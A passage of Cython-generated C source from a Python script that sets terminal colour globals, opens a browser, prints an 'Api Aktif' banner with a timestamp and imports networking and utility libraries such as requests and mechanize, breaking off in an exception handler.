  if (PyDict_SetItem(__pyx_d, __pyx_n_s_E, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 81, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G, __pyx_kp_u_1_35m) < 0) __PYX_ERR(0, 82, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 83, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Q, __pyx_kp_u_1_36m) < 0) __PYX_ERR(0, 84, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_X, __pyx_kp_u_1_36m) < 0) __PYX_ERR(0, 85, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z1, __pyx_kp_u_2_31m) < 0) __PYX_ERR(0, 86, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_F, __pyx_kp_u_2_32m) < 0) __PYX_ERR(0, 87, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_A, __pyx_kp_u_2_34m) < 0) __PYX_ERR(0, 88, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_2_35m) < 0) __PYX_ERR(0, 89, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_1_39m_2) < 0) __PYX_ERR(0, 90, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Y, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 91, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_M, __pyx_kp_u_1_32m) < 0) __PYX_ERR(0, 92, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_S, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 93, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_U, __pyx_kp_u_1_39m_2) < 0) __PYX_ERR(0, 94, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BRed, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 95, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BGreen, __pyx_kp_u_1_32m) < 0) __PYX_ERR(0, 96, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BYellow, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 97, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_R, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 98, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BPurple, __pyx_kp_u_1_35m) < 0) __PYX_ERR(0, 99, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BCyan, __pyx_kp_u_1_36m) < 0) __PYX_ERR(0, 100, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BWhite, __pyx_kp_u_1_37m) < 0) __PYX_ERR(0, 101, __pyx_L1_error)

  
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_webbrowser); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 102, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_open); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 102, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__47, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 102, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_datetime); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 103, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_datetime); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 103, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_now); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 103, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallNoArg(__pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 103, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_x, __pyx_t_1) < 0) __PYX_ERR(0, 103, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __pyx_int_0;
  __Pyx_INCREF(__pyx_t_1);
  __pyx_t_7 = __pyx_int_0;
  __Pyx_INCREF(__pyx_t_7);
  __pyx_t_2 = __pyx_int_0;
  __Pyx_INCREF(__pyx_t_2);
  __pyx_t_8 = __pyx_int_0;
  __Pyx_INCREF(__pyx_t_8);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ins1, __pyx_t_1) < 0) __PYX_ERR(0, 104, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ins2, __pyx_t_7) < 0) __PYX_ERR(0, 104, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_gm1, __pyx_t_2) < 0) __PYX_ERR(0, 104, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_gm2, __pyx_t_8) < 0) __PYX_ERR(0, 104, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_M); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 105, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_8, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 105, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = __Pyx_PyUnicode_Concat(__pyx_t_2, __pyx_n_u__48); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 105, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_8); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 105, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_Api_Aktif, __pyx_n_s_format); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 106, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_B); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 106, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_x); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 106, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_1 = PyTuple_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 106, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_8);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_8);
  __Pyx_GIVEREF(__pyx_t_7);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_7);
  __pyx_t_8 = 0;
  __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_1, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 106, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 106, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_M); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 107, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 107, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyUnicode_Concat(__pyx_t_7, __pyx_n_u__48); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 107, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 107, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G, __pyx_kp_u_1_35m) < 0) __PYX_ERR(0, 108, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 109, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_X, __pyx_kp_u_1_36m) < 0) __PYX_ERR(0, 110, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z1, __pyx_kp_u_2_31m) < 0) __PYX_ERR(0, 111, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_F, __pyx_kp_u_2_32m) < 0) __PYX_ERR(0, 112, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_A, __pyx_kp_u_2_34m) < 0) __PYX_ERR(0, 113, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_2_35m) < 0) __PYX_ERR(0, 114, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 115, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Y, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 116, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_M, __pyx_kp_u_1_37m) < 0) __PYX_ERR(0, 117, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_S, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 118, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_U, __pyx_kp_u_1_37m) < 0) __PYX_ERR(0, 119, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 120, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_R, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 121, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_X, __pyx_kp_u_1_36m) < 0) __PYX_ERR(0, 122, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_F, __pyx_kp_u_2_32m) < 0) __PYX_ERR(0, 123, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_1_97m) < 0) __PYX_ERR(0, 124, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 125, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Y, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 126, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_E, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 127, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 128, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G, __pyx_kp_u_1_32m) < 0) __PYX_ERR(0, 129, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_S, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 130, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C1, __pyx_kp_u_2_35m) < 0) __PYX_ERR(0, 131, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z1, __pyx_kp_u_2_31m) < 0) __PYX_ERR(0, 132, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_M, __pyx_kp_u_1_37m) < 0) __PYX_ERR(0, 133, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BRed, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 134, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BGreen, __pyx_kp_u_1_32m) < 0) __PYX_ERR(0, 135, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BYellow, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 136, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_R, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 137, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BPurple, __pyx_kp_u_1_35m) < 0) __PYX_ERR(0, 138, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BCyan, __pyx_kp_u_1_36m) < 0) __PYX_ERR(0, 139, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BWhite, __pyx_kp_u_1_37m) < 0) __PYX_ERR(0, 140, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_38_5_208m) < 0) __PYX_ERR(0, 141, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 142, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_X, __pyx_kp_u_1_36m) < 0) __PYX_ERR(0, 143, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_F, __pyx_kp_u_2_32m) < 0) __PYX_ERR(0, 144, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_1_97m) < 0) __PYX_ERR(0, 145, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 146, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_R, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 147, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_X, __pyx_kp_u_1_36m) < 0) __PYX_ERR(0, 148, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_F, __pyx_kp_u_2_32m) < 0) __PYX_ERR(0, 149, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_1_97m) < 0) __PYX_ERR(0, 150, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 151, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Y, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 152, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_E, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 153, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 154, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G, __pyx_kp_u_1_32m) < 0) __PYX_ERR(0, 155, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_S, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 156, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C1, __pyx_kp_u_2_35m) < 0) __PYX_ERR(0, 157, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_S, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 158, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B_2, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 159, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_K, __pyx_kp_u_2_35m) < 0) __PYX_ERR(0, 160, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_U, __pyx_kp_u_2_35m) < 0) __PYX_ERR(0, 161, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Y, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 162, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 163, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 164, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_X, __pyx_kp_u_1_36m) < 0) __PYX_ERR(0, 165, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_F, __pyx_kp_u_2_32m) < 0) __PYX_ERR(0, 166, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_1_97m) < 0) __PYX_ERR(0, 167, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 168, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Y, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 169, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_1_97m) < 0) __PYX_ERR(0, 170, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_E, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 171, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 172, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G, __pyx_kp_u_1_32m) < 0) __PYX_ERR(0, 173, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_S, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 174, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_S, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 175, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_38_5_208m) < 0) __PYX_ERR(0, 176, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BYellow, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 177, __pyx_L1_error)

  
  __pyx_t_7 = PyList_New(0); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 178, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ids, __pyx_t_7) < 0) __PYX_ERR(0, 178, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_5, &__pyx_t_4, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      
      __pyx_t_7 = __Pyx_Import(__pyx_n_s_os, 0, 0); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 180, __pyx_L10_error)
      __Pyx_GOTREF(__pyx_t_7);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_7) < 0) __PYX_ERR(0, 180, __pyx_L10_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

      
      __pyx_t_7 = __Pyx_Import(__pyx_n_s_requests, 0, 0); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 181, __pyx_L10_error)
      __Pyx_GOTREF(__pyx_t_7);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_requests, __pyx_t_7) < 0) __PYX_ERR(0, 181, __pyx_L10_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

      
      __pyx_t_7 = __Pyx_Import(__pyx_n_s_json, 0, 0); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 182, __pyx_L10_error)
      __Pyx_GOTREF(__pyx_t_7);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_json, __pyx_t_7) < 0) __PYX_ERR(0, 182, __pyx_L10_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

      
      __pyx_t_7 = PyList_New(1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 183, __pyx_L10_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_INCREF(__pyx_n_s_generate_user_agent);
      __Pyx_GIVEREF(__pyx_n_s_generate_user_agent);
      PyList_SET_ITEM(__pyx_t_7, 0, __pyx_n_s_generate_user_agent);
      __pyx_t_1 = __Pyx_Import(__pyx_n_s_user_agent_2, __pyx_t_7, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 183, __pyx_L10_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_generate_user_agent); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 183, __pyx_L10_error)
      __Pyx_GOTREF(__pyx_t_7);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_generate_user_agent, __pyx_t_7) < 0) __PYX_ERR(0, 183, __pyx_L10_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      
      __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 184, __pyx_L10_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_INCREF(__pyx_n_s_uuid4);
      __Pyx_GIVEREF(__pyx_n_s_uuid4);
      PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_uuid4);
      __pyx_t_7 = __Pyx_Import(__pyx_n_s_uuid, __pyx_t_1, 0); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 184, __pyx_L10_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_7, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 184, __pyx_L10_error)
      __Pyx_GOTREF(__pyx_t_1);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_uuid4, __pyx_t_1) < 0) __PYX_ERR(0, 184, __pyx_L10_error)
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

      
      __pyx_t_7 = __Pyx_Import(__pyx_n_s_random, 0, 0); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 185, __pyx_L10_error)
      __Pyx_GOTREF(__pyx_t_7);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_random, __pyx_t_7) < 0) __PYX_ERR(0, 185, __pyx_L10_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

      
      __pyx_t_7 = __Pyx_Import(__pyx_n_s_mechanize, 0, 0); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 186, __pyx_L10_error)
      __Pyx_GOTREF(__pyx_t_7);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_mechanize, __pyx_t_7) < 0) __PYX_ERR(0, 186, __pyx_L10_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

      
      __pyx_t_7 = __Pyx_Import(__pyx_n_s_uuid, 0, 0); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 187, __pyx_L10_error)
      __Pyx_GOTREF(__pyx_t_7);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_uuid, __pyx_t_7) < 0) __PYX_ERR(0, 187, __pyx_L10_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

      
      __pyx_t_7 = __Pyx_Import(__pyx_n_s_time, 0, 0); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 188, __pyx_L10_error)
      __Pyx_GOTREF(__pyx_t_7);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_time, __pyx_t_7) < 0) __PYX_ERR(0, 188, __pyx_L10_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

      
      __pyx_t_7 = PyList_New(1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 189, __pyx_L10_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_INCREF(__pyx_n_s_sleep);
      __Pyx_GIVEREF(__pyx_n_s_sleep);
      PyList_SET_ITEM(__pyx_t_7, 0, __pyx_n_s_sleep);
      __pyx_t_1 = __Pyx_Import(__pyx_n_s_time, __pyx_t_7, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 189, __pyx_L10_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_sleep); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 189, __pyx_L10_error)
      __Pyx_GOTREF(__pyx_t_7);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_sleep, __pyx_t_7) < 0) __PYX_ERR(0, 189, __pyx_L10_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L15_try_end;
    __pyx_L10_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    
    __pyx_t_6 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
    if (__pyx_t_6) {
      __Pyx_AddTraceback("source", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_7, &__pyx_t_2) < 0) __PYX_ERR(0, 190, __pyx_L12_except_error)
